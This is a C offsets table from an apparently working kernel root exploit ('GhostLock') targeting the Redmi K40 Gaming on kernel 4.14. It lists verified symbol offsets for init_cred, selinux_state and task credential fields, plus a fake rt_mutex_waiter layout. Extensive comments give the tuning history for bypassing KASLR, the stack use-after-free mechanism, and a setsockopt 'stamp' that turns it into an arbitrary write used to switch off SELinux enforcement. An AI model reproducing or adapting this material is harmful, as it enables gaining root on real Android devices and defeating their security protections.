/* Redmi K40 Gaming (ares) — MediaTek MT6893 (Dimensity 1200), kernel 4.14.186
 * MIUI/HyperOS V816.0.4.0.TKJCNXM (Android 13)
 *
 * All values extracted from the device's own boot.img:
 *   boot.img -> Image (gzip) -> vmlinux.elf (kallsyms + rela)
 *   KIMAGE_TEXT_BASE = 0xffffff8008080000  (verified via rela table)
 * Cross-checked against MiCode/Xiaomi_Kernel_OpenSource @ ares-r-oss
 * and the device's /proc/config.gz.
 *
 * uname -r: 4.14.186-g844fd19c6
 *
 * NOTE 4.14 differences vs upstream (6.1/6.6/6.12):
 *   - no kCFI / no ShadowCallStack
 *   - no configfs_read_iter / configfs_bin_write_iter / copy_splice_read
 *   - no ashmem show_fdinfo / compat_ioctl
 *   - rt_mutex_waiter is the OLD 0x50-byte layout (== STRUCT_OFFSETS_6_1)
 *   - PAGE_OFFSET is 0xffffff8000000000 (NOT 0xffffffc0...)
 */

#define PSELECT_WORDS_ARES \
  .pselect_words = { \
    { 2, WV_ZERO},   /* tree.rb_parent_color = 0 → the value written is 0 */ \
    { 3, WV_ZERO},   /* tree.rb_right = 0 (no right child) */ \
    { 4, WV_TARGET}, /* tree.rb_left = target → rb_erase does *(rb_left) = parent_color = 0 */ \
    { 5, WV_ZERO}, /* pi_tree.rb_parent_color */ \
    { 6, WV_ZERO}, /* pi_tree.rb_right */ \
    { 7, WV_ZERO}, /* pi_tree.rb_left */ \
    { 8, WV_TASK}, /* task (at 0x30) */ \
    { 9, WV_LOCK}, /* lock (at 0x38) */ \
    {10, WV_WAKE_PRIO}, /* wake_state(0x40) + prio(0x44) packed */ \
    {11, WV_ZERO}, /* deadline (at 0x48) */ \
    {-1, 0} \
  }

OFFSETS_ENTRY("4.14.186-g844fd19c6",
  /* ---- memory layout ---- */
  .kimage_text_base=0xffffff8008080000ULL,
  .p0_page_offset=0xffffff8000000000ULL,
  .p0_phys_offset=0x40000000ULL,        /* MTK DRAM base */
  .p0_kernel_phys_load=0x40080000ULL,   /* boot header kernel_addr */
  /* ===== gK54 根本纠正（2026-10-22 A 级实测）：PAGE_OFFSET 固定，但线性映射被 KASLR 平移 =====
   * [A-实测 gK53 --bfself] 全 VA 扫描连中 4 次，真 mm_struct 实际落在
   *   0xffffffd7c1b33100 / 0xffffffd825bf3800 / 0xffffffd825bf4600 / 0xffffffd843ce8380
   *   比源码推导的 PAGE_OFFSET(0xffffffc000000000) 高约 24GiB，且每次运行都不同。
   * [B-源码] CONFIG_RANDOMIZE_BASE=y，arm64 KASLR 会平移 memstart_addr，
   *   linear map = PAGE_OFFSET + (phys - memstart_addr) ⇒ 基址随每次启动漂移。
   * ⇒ 任何「固定 PAGE_OFFSET + 固定 8GiB 窗口」都必然摸空（这就是 11 轮零命中的根因②）。
   * [A-实测] 扫 [0xffffffc000000000, 0xffffffffffffffff) 共 256GiB、
   *   250M 候选、8 线程仅 ~0.65s，代价完全可接受 ⇒ 默认就用全段。
   * [A-实测交叉验证] 4 个命中地址在 order-3 slab(0x8000) 内偏移为
   *   0x3100/0x3800/0x4600/0x380，全是 0x380 的精确整数倍，精确坐在 mm_cachep 网格上，非假阳。
   */
  .kernelsnitch_identity_start=0xffffffc000000000ULL,
  /* ===== gK48 根本纠正：PAGE_OFFSET 不是 0xffffff8000000000 =====
   * [A-实测] /proc/config.gz: CONFIG_ARM64_VA_BITS=39, CONFIG_KASAN is not set
   * [B-源码] arch/arm64/include/asm/memory.h:65-72
   *   VA_START    = 0xffffffffffffffff - (1<<39) + 1   = 0xffffff8000000000
   *   MODULES_VADDR = VA_START + KASAN_SHADOW_SIZE(0)  = 0xffffff8000000000
   *   MODULES_END = MODULES_VADDR + 128M               = 0xffffff8008000000
   *   KIMAGE_VADDR = MODULES_END                       = 0xffffff8008000000
   *   PAGE_OFFSET = 0xffffffffffffffff - (1<<38) + 1   = **0xffffffc000000000**
   * [B-源码] memory.h:276 __phys_to_virt(x) = ((x) - PHYS_OFFSET) | PAGE_OFFSET
   *   ⇒ 线性映射区起点就是 PAGE_OFFSET = 0xffffffc000000000
   * [B-源码] memory.h:59 注释原文：
   *   "PAGE_OFFSET - the virtual address of the start of the linear map"
   *
   * ⚠ 旧值 0xffffff8000000000 是 VA_START/MODULES_VADDR（内核模块区），
   *   不是线性映射区！之前 gK45(8G)/gK46(16G)/gK47(64G) 全部扫在
   *   0xffffff8000000000 起的模块区+空洞，根本不含 mm_struct 所在的线性映射区，
   *   这就是为什么 64GiB 扫完仍 0 命中、7 个步长全试仍 0 命中。
   * [C-计算] 线性映射区实际 = [0xffffffc000000000, 0xffffffc000000000 + 7.34GiB]
   *          MemTotal = 7692468 kB = 7.34 GiB（实测）
   *          ⇒ 上界 0xffffffc1d582d000，取 0xffffffc200000000 (+8GiB) 全覆盖
   */
  /* ===== 重建134（gK34）：范围恢复 64GiB，先完全复现 2026-10-19 成功条件 =====
   * 成功那次的范围就是 64GiB。收窄到 8GiB 是后来的假设（重建128），
   * 未经验证就改会引入新变量。先复现，再单变量对比。
   * （DRAM guard 仍在 util.c 里作为安全网，bogus 地址会被拦下不会崩） */
  /* ===== 重建135（gK35）：范围收窄到 8GiB，配合 hashsize=256 首次尝试 =====
   * 此前从未试过的组合：
   *   r117/r120/r121 = hashsize 2048 + 8GiB  -> 一个候选都找不到
   *   r122           = hashsize 256  + 64GiB -> 找到候选但 phys_off=12.6GiB(bogus)
   * 本版 = hashsize 256 + 8GiB -> 候选集全部落在真实 DRAM(7.34GiB) 内，
   *   假阳性即使存在也只会在 DRAM 内，能被 guard 放行去尝试真实利用。
   * DRAM guard 仍保留在 util.c 作为安全网。 */
  /* ===== gK46：范围由 +8GiB 扩到 +64GiB =====
   * [历史] r117/r120/r121 = hashsize 2048 + 8GiB → 一个候选都找不到
   *        gK45 复现同样结果（bf_mm_is_minus1=1）
   * [已排除] 碰撞真（3000倍，gK44 24 次实测）
   *          hash 对（内核 futex.c:407 与客户端逐行一致）
   *          扫完（94ms 吻合 8 线程预期）
   * [C-计算] hashsize=2048 下巧合命中概率 5.7e-14 × 9.4e6 = 5.4e-7
   *   ⇒ bf_mm_is_minus1=1 只能说明「8GiB 里没有真 mm」
   * [C-计算] 64GiB 扫描成本 = 94ms × 8 ≈ 752ms/次，可接受
   *         且验伪率极低，一旦命中可信任
   */
  .kernelsnitch_identity_end=0xffffffffffffffffULL,    /* gK54：全内核半区 256GiB（KASLR 下唯一可靠上界）
       * [C-计算] 0xffffffc000000000 + 0x200000000 (8GiB) = 0xffffffc200000000
       *   实际物理 7.34GiB（MemTotal 7692468 kB）⇒ 上界 0xffffffc1d582d000
       *   +8GiB 全覆盖，留 0.66GiB 余量
       *   扫描量 = 8GiB/896 = 9,437,184 候选，实测耗时 ~94ms
       */
  .direct_map_end=0xffffff9000000000ULL,

  /* ---- global symbols (offset from KIMAGE_TEXT_BASE) ---- */
  .off_init_task=0x01C5BEC0,          /* VERIFIED: comm "swapper" @+0x798 */
  .off_init_cred=0x01C69158,          /* VERIFIED: uid=0 caps=0x3fffffffff usage=4 */
  .off_init_uts_ns=0x01C5B078,
  .off_empty_zero_page=0x01E5F000,
  .off_root_task_group=0x01C4DB78,    /* VERIFIED via kallsyms: root_task_group @ 0xffffff8009ccdb78 */
  /* ★ 2026-10-27 P3 定案（节点87）：0x02080B28 是错的！
   * 0xffffff800a100b28 = selinux_enforcing_boot（static int，仅 __init 用一次，
   *   运行期不再被读取）。改它 getenforce 永远不变。
   * 运行时真开关 = struct selinux_state.enforcing（bool，结构体内偏移 +1）。
   * selinux_init 反汇编铁证：
   *   0x9730590  add x8, x8, #0xb08   ⇒ &selinux_state = 0xffffff800a100b08
   *   0x97305b8  strb w10,[x8,#1]     ⇒ state->enforcing
   * 写原语是 8 字节 store（rb_erase_cached 0x5904 str x9,[x8,#8]），
   * 一次清零覆盖 +0..+7：disabled/enforcing/checkreqprot/initialized/policycap[0..3]，
   * avc(@+16)、ss(@+24) 不在写范围内，安全。 */
  .off_selinux_enforcing=0x02080B08,  /* = &selinux_state (0xffffff800a100b08)，enforcing 在 +1 */
  .off_kptr_restrict=0,               /* TODO */
  .off_selinux_blob_sizes=0,          /* SELinux is the only LSM => lbs_cred = 0, default OK */
  .off_security_hook_heads=0,         /* only used for logging in install_android_root */
  .off_kmalloc_caches=0x015F61D8,     /* VERIFIED via ksymtab */
  .off_anon_pipe_buf_ops=0x010A3648,  /* candidate: {confirm,release,steal,get} */
  .off_ashmem_misc_fops=0x01DA6508,   /* VERIFIED: miscdevice @0xffffff8009e26508 */
  .off_ashmem_fops=0x011F1078,        /* VERIFIED: fops @0xffffff8009271078 */
  .off_ashmem_ioctl=0x00CF95B0,       /* VERIFIED */
  .off_ashmem_compat_ioctl=0,         /* NOT PRESENT in 4.14 build */
  .off_ashmem_mmap=0x00CF9ED8,        /* VERIFIED */
  .off_ashmem_open=0x00CFA040,        /* VERIFIED */
  .off_ashmem_release=0x00CFA0C0,     /* VERIFIED */
  .off_ashmem_show_fdinfo=0,          /* NOT PRESENT in 4.14 */
  /* 4.14 configfs names are the OLD ones (upstream uses *_iter names) */
  .off_configfs_read_iter=0x0029634C,      /* = configfs_read_file      */
  .off_configfs_bin_write_iter=0x00296864, /* = configfs_write_bin_file */
  .off_copy_splice_read=0,            /* NOT PRESENT in 4.14 */
  .off_noop_llseek=0x001EF408,        /* VERIFIED */
  .off_cap_capable_active=0,          /* TODO */
  .off_slide_nfulnl_logger=0x01C51500, /* ares: nfulnl_logger @ 0xffffff8009cd1500 (img off 0x1C51500) */
  .off_slide_loggers_0_1=0x01C51420,   /* ares: loggers[] @ 0xffffff8009cd1420 (slot PF_INET=0) */
  .off_slide_boot_id=0x020A2670,       /* ares: boot_id ctl_table.data @ 0xffffff800a12e670 */

  /* ---- task_struct ---- */
  .task_usage=0x40,                     /* gK72 修正: 原 0x10 错误; 铁证 __put_task_struct ldr w8,[x19,#64] + copy_process str w9,[x19,#64] */
  .task_prio=0x84,                    /* rt_mutex_setprio ldr [x,#0x8c]/[x,#0x5c] */
  .task_normal_prio=0x8C,               /* gK68 修正: 原 0x88 实为 static_prio; 铁证 rt_mutex_setprio+0xd8 ldr w22,[x19,#140] */
  .task_sched_task_group=0x848,       /* aresin verified */
  .task_pi_lock=0x85C,                /* ★ rt_mutex_adjust_prio_chain */
  .task_pi_waiters=0x868,             /* ★ */
  .task_pi_top_task=0x878,              /* gK68 修正: 原 0x870 实为 pi_waiters.rb_leftmost; 铁证 rt_mutex_setprio+0x17c str x23,[x19,#2168] */
  .task_pi_blocked_on=0x880,          /* ★ vulnerability core */
  .task_pid=0x5C4,
  .task_tgid=0x5C8,
  .task_real_parent=0x5D8,
  .task_atomic_flags=0x5F0,
  .task_real_cred=0x788,              /* == upstream 6.1 */
  .task_cred=0x790,                   /* == upstream 6.1 */
  .task_comm=0x798,
  .task_tasks=0x638,
  .task_seccomp=0xA88,

  /* ---- cred (== upstream 6.1) ---- */
  .cred_uid=0x04,
  .cred_securebits=0x24,
  .cred_caps=0x28,
  .cred_security=0x78,

  /* ---- file_operations ---- */
  .fops_owner=0x00,
  .fops_llseek=0x08,
  .fops_read=0x10,
  .fops_write=0x18,
  .fops_read_iter=0x20,
  .fops_write_iter=0x28,
  .fops_ioctl=0x50,
  .fops_compat_ioctl=0x58,
  .fops_mmap=0x60,
  .fops_open=0x68,
  .fops_release=0x78,
  .fops_splice_read=0xB8,
  .fops_show_fdinfo=0xD0,

  .mm_owner=0x3A8,                    /* get_task_mm */
  /* ===== 重建144（gK41，2026-10-21）：0x500 -> 0x380，B 级推导链 =====
   * [反汇编] mm_alloc @ 0xffffff80080b1e10 尾部 __memset(mm, 0, 0x360)
   *          => sizeof(struct mm_struct) = 0x360 = 864
   * [源码] mm/slub.c:3711   s->size = ALIGN(size, s->align)
   * [计算] ALIGN(864, 64)  = 896 = 0x380   (arm64 cache_line_size=64)
   *        ALIGN(864, 128) = 896 = 0x380   (改 align 也得同一结果，稳健)
   * [实测] /sys/kernel/slab/mm_struct -> :A-0000896
   * [源码] slub.c:5738 create_unique_id(): sprintf(p, "%07d", s->size)
   *        => sysfs 名里的数字就是 s->size
   * => 0x360(结构体) 与 :A-0000896(slab 步长) 完全一致，不存在矛盾。
   *
   * 推翻旧注释「0xa00/0x500=2.000 唯一整除」铁证 -- 那是唯一解幻觉：
   *   (1) 0xa00 能被 0x80 的任意倍数整除，不构成 0x500 的证明；
   *   (2) 更关键：bruteforce 不读候选地址，只做 8bit futex hash 比对
   *       (futex_hash & 0xFF)，单候选假阳率 (1/256)^3=5.96e-8，
   *       搜索 9.44e6 候选 => 期望假阳 0.56 => 单次命中真值概率仅 ~64%。
   *       那条成功日志本身有 ~36% 概率是假阳性，不能当铁证。
   *   (3) gK39(0x500) 与 gK40(0x380) 崩点完全相同（trylock+0x1c），
   *       步长并非 H1 根因。
   * 旧「0x360 失败」的真因：当年直接传了未对齐的 0x360（枚举点漂移必 miss），
   *   而不是 0x360 这个 sizeof 值错。已回滚注释把因归错了。
   * 回滚：MM_SZ=0x500 ./gK41（util.c:697 环境变量优先于本表） */
  .mm_struct_sz=0x380,

  /* ---- configfs_buffer (4.14 layout, = upstream - 16 for most fields) ---- */
  .cfg_page=16,
  .cfg_needs_read_fill=64,            /* upstream 80 */
  .cfg_bin_buffer=72,                 /* upstream 88 */
  .cfg_bin_buffer_size=80,            /* upstream 96 */
  .cfg_cb_max_size=84,                /* upstream 100 */
  .ashmem_name_prefix_len=11,         /* "dev/ashmem/" prefix used by primitive */

  /* ---- rt_mutex_waiter (4.14 old layout, size 0x50) ---- */
  .waiter_tree=0x00,
  .waiter_pi_tree=0x18,
  .waiter_task=0x30,
  .waiter_lock=0x38,
  .waiter_wake_state=0x40,
  .waiter_prio=0x40,
  .waiter_deadline=0x48,
  .waiter_ww_ctx=0x50,
.waiter_pi_tree_prio=0x40,
  .waiter_pi_tree_deadline=0x48,
  /* pselect_waiter_word_shift: index of the fd_set word that lands on
   * waiter+0x10 (waiter_pi_tree.rb_left), see prepare_pselect_fdsets().
   *
   * ★★ CORRECTED MECHANISM (2026-10-16 evening, after reading IonStack PoC +
   *    the iQOO Neo9S Pro (MT6989/6.1) working port `zhubaohe123/ghostlock-kit`)
   * ------------------------------------------------------------------------
   * GhostLock is a *stack* UAF, NOT a heap UAF, and the bug is:
   *   remove_waiter() cleans `current->pi_blocked_on` instead of the *waiter*
   *   thread's pi_blocked_on. So when the futex times out / is requeued away,
   *   the waiter thread still has task->pi_blocked_on dangling to the
   *   `struct rt_mutex_waiter` that lives ON ITS OWN KERNEL STACK (do_futex
   *   frame). The thread returns to userspace with that stale pointer.
   *
   * The exploitation primitive is therefore NOT "make fd_set and the waiter
   * overlap inside one syscall". It is "stamp": AFTER futex_wait_requeue_pi()
   * returns *in the same thread*, issue another syscall whose on-stack buffer
   * reuses the very same kernel-stack addresses as the old rt_waiter, so the
   * stale pi_blocked_on now points at attacker-controlled bytes. Then a
   * consumer thread runs sched_setattr(waiter_tid) -> rt_mutex_adjust_prio_chain
   * -> rt_mutex_dequeue -> rb_erase_cached => constrained arbitrary write.
   *
   * Hence the fd_set overlay must cover [waiter+0x00 .. waiter+0x30] fully and
   * *word-aligned*: rb_erase needs the 0x00 pc, 0x08 right, 0x10 left, the task
   * pointer at 0x30 and lock at 0x38 to be exactly right. fd_set only sets
   * individual bits (so 0x08 can never become base+0x100 as WV_TARGET wants),
   * and the pselect6/select frames sit far above do_futex anyway. -> the
   * pselect route cannot express the primitive.  Do NOT re-tune this shift.
   *
   * REPLACEMENT (upstream-proven): use a setsockopt() "stamp" instead:
   *   setsockopt(fd, SOL_IP, MCAST_JOIN_SOURCE_GROUP, buf, 0x108)
   * which runs memset(0x108)+copy_from_user(0x108) inside do_ip_setsockopt and
   * overwrites the stale waiter with a single aligned memcpy. Set buf[8]=0 so
   * the family check fails and the syscall returns cleanly (poison only, no
   * side effect). iQOO port also lists IP_MINTTL(0x20) and IP_MSFILTER(0x150)
   * as higher-priority stamps when the frame offsets differ.
   * See offsets below for the 4.14 do_ip_setsockopt frame measurement. */
  .pselect_waiter_word_shift=0,
  PSELECT_WORDS_ARES
),
